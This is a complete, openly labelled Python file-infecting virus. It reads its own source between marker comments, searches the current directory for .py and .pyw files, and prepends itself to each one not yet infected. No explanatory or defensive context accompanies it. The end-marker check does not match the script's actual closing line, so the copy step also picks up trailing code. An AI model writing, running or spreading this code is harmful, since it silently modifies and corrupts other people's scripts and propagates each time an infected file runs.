### START OF VIRUS ###

import sys, glob

code = []
# Get the source code from the file.
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

virus_are = False
for line in lines:
    if line == '### START OF VIRUS ###\n':
        virus_are = True
    if virus_are:
        code.append(line)
    if line == '### END OF VIRUS\n':
        break

# Get the python scripts.
python_scripts = glob.glob('*.py') + glob.glob('*.pyw')

# Inject the code.
for script in python_scripts:
    with open(script, 'r') as f:
        script_code = f.readlines()

    infected = False
    for line in script_code:
        if '### START OF VIRUS ###' in line:
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(code)
        final_code.append('\n')
        final_code.extend(script_code)

        with open(script, 'w') as f:
            f.writelines(final_code)

### END OF VIRUS ###
